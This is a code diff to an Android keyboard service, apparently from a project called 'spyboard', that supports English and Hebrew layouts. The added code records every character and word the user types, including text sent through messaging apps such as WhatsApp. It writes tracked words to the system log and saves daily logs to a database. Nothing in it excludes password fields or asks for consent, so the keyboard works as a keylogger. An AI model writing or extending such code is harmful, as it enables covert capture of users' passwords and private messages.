@@ -9,8 +9,10 @@ import android.view.View;
 import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputConnection;
 
+import com.idankorenisraeli.spyboard.common.TimeManager;
 import com.idankorenisraeli.spyboard.data.DailyUsageLog;
-import com.idankorenisraeli.spyboard.data.FirebaseManager;
+import com.idankorenisraeli.spyboard.data.DatabaseManager;
+import com.idankorenisraeli.spyboard.data.OnDailyLogLoaded;
 import com.idankorenisraeli.spyboard.data.UsageLog;
 import com.idankorenisraeli.spyboard.utils.KeycodeDictionary;
 import com.idankorenisraeli.spyboard.R;
@@ -31,15 +33,16 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
     String currentDate;
     DailyUsageLog dailyLog;
-    UsageLog usageLog;
+    UsageLog sessionUsageLog;
 
     private static final int AVG_WORD_LENGTH = 16;
 
     StringBuilder currentWord = new StringBuilder(AVG_WORD_LENGTH);
 
+    DatabaseManager databaseManager;
 
 
-    interface KEYS{
+    interface KEYS {
         int ENTER = -10;
     }
 
@@ -51,72 +54,82 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         hebKeyboard = new Keyboard(this, R.xml.qwerty_heb);
 
         dictionary = KeycodeDictionary.getInstance();
+        databaseManager = DatabaseManager.getInstance();
+        currentDate = TimeManager.getInstance().getDateOfToday();
 
         keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
         keyboardView.setOnKeyboardActionListener(keyBoardAction);
 
         keyboardView.setPreviewEnabled(false);
 
-        FirebaseManager firebaseManager = FirebaseManager.getInstance();
-
         return keyboardView;
     }
 
 
     //region Keyboard Actions
-    private void languageAction(){
+    private void languageAction() {
         hebrewMode = !hebrewMode;
         keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
         // Updating the keyboard view based on the current mode
     }
 
-    private void deleteAction(InputConnection ic){
+    private void deleteAction(InputConnection ic) {
         CharSequence selectedText = ic.getSelectedText(0);
         if (TextUtils.isEmpty(selectedText)) {
             // no selection, so delete previous character
             ic.deleteSurroundingText(1, 0);
+            if(currentWord.length() > 0){
+                currentWord.deleteCharAt(currentWord.length()-1);
+            }
         } else {
             // delete the selection
             ic.commitText("", 1);
         }
     }
 
-    private void shiftAction(){
+    private void shiftAction() {
         caps = !caps;
         keyboardView.setShifted(caps);
     }
 
-    private void enterAction(InputConnection ic){
+    private void enterAction(InputConnection ic) {
         ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
     }
 
-    private void charAction(int primaryCode, InputConnection ic){
+    private void charAction(int primaryCode, InputConnection ic) {
         String typed = codeToString(primaryCode);
         ic.commitText(typed, 1); //writing to screen
 
         trackKeyPress(typed);
     }
 
-    private void trackKeyPress(String typed){
-        if(typed.equals(" ")){
-            usageLog.addWord(currentWord.toString());
-            Log.i("pttt", "Adding word " + currentWord.toString() + " HEY");
-            currentWord = new StringBuilder(AVG_WORD_LENGTH);
-            //reset the strbuilder
-        }
-        else
-            currentWord.append(typed); //Calculating the word
+    private void trackKeyPress(String typed) {
+        if (sessionUsageLog != null) {
 
-        if(usageLog!=null)
-            usageLog.addChar(typed);
+            if (typed.equals(" ")) {
+                trackWord();
+                //reset the strbuilder
+            } else {
+                currentWord.append(typed); //Calculating the word by adding char by char
+                sessionUsageLog.addChar(typed); //Adding to single chars map
+            }
+        }
     }
 
-    private String codeToString(int primaryCode){
-        char finalCode;
-        if(hebrewMode){
-            finalCode = dictionary.engToHeb(primaryCode);
+    private void trackWord(){
+        if(currentWord.length() > 0) {
+            sessionUsageLog.addWord(currentWord.toString());
+            Log.i("pttt", "Tracked Word: " + currentWord.toString());
+            currentWord = new StringBuilder(AVG_WORD_LENGTH);
+
         }
-        else{
+    }
+
+    private String codeToString(int primaryCode) {
+        char finalCode;
+        if (hebrewMode) {
+            finalCode = dictionary.engToHeb(primaryCode);
+        } else {
             primaryCode = caps ? primaryCode + ('A' - 'a') : primaryCode; // converting to upper case when shift
             finalCode = (char) primaryCode; // converting to char
         }
@@ -142,6 +155,9 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         public void onKey(int primaryCode, int[] keyCodes) {
             InputConnection ic = getCurrentInputConnection();
             if (ic == null) return;
+            if(!isTextBefore()) {
+                trackWord();
+            }
             switch (primaryCode) {
                 case Keyboard.KEYCODE_DELETE:
                     deleteAction(ic);
@@ -160,7 +176,6 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
                     charAction(primaryCode, ic);
             }
         }
-
 
 
         @Override
@@ -189,19 +204,31 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     };
 
 
+    /**
+     * This method will calculate if there is a text before current ic
+     * It will help us calcualte a new word even though user did not press the spacebar
+     * because in messaging apps, like whatsapp, there is a 'send' key which is not a part of the keyboard
+     * and there is still a new word there that needs to be tacked.
+     * @return true when there is a text
+     */
+    private boolean isTextBefore(){
+        InputConnection ic = getCurrentInputConnection();
+        return ic.getTextBeforeCursor(1,0).length() != 0;
+    }
+
+
     @Override
     public void onStartInputView(EditorInfo info, boolean restarting) {
         super.onStartInputView(info, restarting);
 
-        if(dailyLog == null) {
+        if (dailyLog == null) {
+            databaseManager.loadDailyLog(TimeManager.getInstance().getDateOfToday(), onDailyLogLoaded);
+        } else if (!currentDate.equals(TimeManager.getInstance().getDateOfToday())) {
+            // new day
             dailyLog = new DailyUsageLog();
-            //TODO - CHECK WITH FIREBASE/SP
-            currentDate = dailyLog.getDate();
         }
 
-        Log.i("pttt", currentDate);
-
-        usageLog = new UsageLog();
+        sessionUsageLog = new UsageLog();
         // New keyboard usage
 
     }
@@ -209,13 +236,50 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
     @Override
     public void onFinishInputView(boolean finishingInput) {
+
+
         super.onFinishInputView(finishingInput);
 
-        //TODO - track last word
+        if (currentWord != null) {
+            trackWord();
+        }
+        //Adding the last word written in this session
 
-        if(dailyLog!=null)
-            dailyLog.addLog(usageLog);
-        //Adding the session data that is finished to the day's total
+        if (dailyLog != null) {
+            dailyLog.addLog(sessionUsageLog);
+            //Adding the session data that is finished to the day's total
+
+            Log.i("pttt", "Daily " + dailyLog.getWordFreq().size());
+            databaseManager.saveDailyLog(dailyLog);
+            //Saving into database
+        } else
+            databaseManager.loadDailyLog(TimeManager.getInstance().getDateOfToday(),
+                    new OnDailyLogLoaded() {
+                        @Override
+                        public void onDailyLogLoaded(DailyUsageLog loadedLog) {
+
+                            if (loadedLog == null) {
+                                dailyLog = new DailyUsageLog();
+                                dailyLog.addLog(sessionUsageLog);
+                                databaseManager.saveDailyLog(dailyLog);
+                                //rebase log
+                            }
+                        }
+                    });
 
     }
+
+    //This will check if log of toady already exists, and update the daily dialog
+    OnDailyLogLoaded onDailyLogLoaded = new OnDailyLogLoaded() {
+        @Override
+        public void onDailyLogLoaded(DailyUsageLog loadedLog) {
+
+            if (loadedLog == null)
+                dailyLog = new DailyUsageLog(); // No daily log is saved
+            else {
+                Log.i("pttt", "Loaded found " + loadedLog.getDate());
+                dailyLog = loadedLog;
+            }
+        }
+    };
 }
